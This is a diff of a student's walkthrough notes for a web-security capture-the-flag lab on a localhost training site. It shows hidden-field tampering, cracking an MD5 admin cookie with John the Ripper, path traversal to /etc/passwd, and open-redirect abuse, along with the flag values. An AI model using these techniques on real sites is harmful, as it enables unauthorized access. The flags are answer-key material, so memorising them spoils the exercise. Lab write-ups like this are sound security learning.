@@ -147,10 +147,18 @@ now we we lower case to : fortytwo, encode it to sha256 as asked and tada : 10A1
 ### Flag 02 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0
 
 http://localhost:13080/index.php?page=recover
+when asking to recover the password, the form has a hidden field
+
+```
+<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
+```
+
 Change webmaster@borntosec.com to whatever
 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0
 
 ### Flag 03 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E
+
+Don't really get this one, just input 'a' as name and nothing as message and you get a flag
 
 http://localhost:13080/index.php?page=feedback
 Name: a
@@ -158,7 +166,11 @@ Name: a
 
 ### Flag 04 (WIP)
 
+found this page by clicking on the very bottom of the screen on "© BornToSec"
+
 Hashcrack this http://localhost:13080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
+
+might actually just be a flag in itself as it looks like SHA-256 as well but ????
 
 ### Flag 05 (WIP)
 
@@ -169,9 +181,43 @@ a weirdly loaded image http://localhost:13080/index.php?page=media&src=1
 Wtf?
 http://localhost:13080/index.php?page=
 
-### Flag 07 (WIP)
+### Flag 07 df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
 
 cookie I_am_admin
+
+cookie value is "68934a3e9455fa72420237eb05902327"
+suspiciously looks like MD5 again
+
+and lo and behold
+
+```
+../john/run/john --format=Raw-MD5 i_am_admin_cookie
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=20
+Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Warning: Only 19 candidates buffered for the current salt, minimum 24 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+0g 0:00:00:00 DONE 1/3 (2024-11-21 17:25) 0g/s 102000p/s 102000c/s 102000C/s Cookie1921..Cookie1900
+Proceeding with wordlist:../john/run/password.lst
+Enabling duplicate candidate password suppressor
+false            (cookie)
+1g 0:00:00:00 DONE 2/3 (2024-11-21 17:25) 7.692g/s 3206Kp/s 3206Kc/s 3206KC/s leticia22..qwzxas
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+so the cookie value is false
+
+replacing it with true in md5 and clicking on home
+
+and we get
+
+```
+Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
+```
 
 ### Flag 08 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
 
@@ -204,7 +250,7 @@ http://localhost:8080/admin/
 
 using root as username and qwerty123@ as password, which gets us the flag
 
-### FLAG 09 (WIP)
+### FLAG 09 b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
 
 http://localhost:8080/index.php?page=../../../../etc/passwd
 
@@ -213,6 +259,16 @@ ALMOST
 http://localhost:8080/index.php?page=../../../../../var/log/httpd/access.log
 
 STILL NOPE
+
+and a bunch more until
+
+http://localhost:8080/index.php?page=../../../../../../../etc/passwd
+
+which gives us
+
+```
+Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
+```
 
 ### FLAG 10 (WIP)
 
@@ -225,6 +281,24 @@ ID: 5
 Title: Hack me ?
 Url : borntosec.ddns.net/images.png
 ```
+
+### FLAG 11 b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
+
+there is a bunch of redirect links at the bottom to twitter, instagram and so on
+
+we can just modify the query from
+
+```
+http://localhost:8080/index.php?page=redirect&site=instagram
+```
+
+to anything
+
+```
+http://localhost:8080/index.php?page=redirect&site=ifoundavulnerability
+```
+
+and we get a flag
 
 ### TO NOTE
 
